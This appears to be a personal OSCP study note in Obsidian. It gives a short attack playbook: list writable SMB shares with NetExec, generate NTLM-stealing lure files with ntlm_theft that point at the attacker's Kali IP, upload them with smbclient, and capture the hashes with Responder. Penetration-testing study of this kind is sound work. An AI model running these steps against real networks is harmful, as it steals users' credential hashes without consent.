With write access to an otherwise empty share named `Shared`, there are files I can drop that might entice any legit visiting user to try to authenticate to my host. [[NTLM Theft]] is a good tool to create a bunch of these files

NetExec Share Listing
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `nxc smb ${discoveredDomain} -u [user] -p '[password]' --shares`;

dv.paragraph("```bash\n" + command + "\n```");
```
https://github.com/Greenwolf/ntlm_theft
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python ~/Desktop/Tools/Windows/ntlm_theft/ntlm_theft.py  -g all -s ${KaliIP} -f exploit`;

dv.paragraph("```bash\n" + command + "\n```");
```
SMB Cred Connect
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `smbclient //${discoveredDomain}/shared -u [user] -p '[password]'`;

dv.paragraph("```bash\n" + command + "\n```");
```
Then connect to the SMB share within this directory and upload all files as:
```
prompt OFF; mput *
```

Whilst having Responder on:

```
sudo responder -I tun0
```
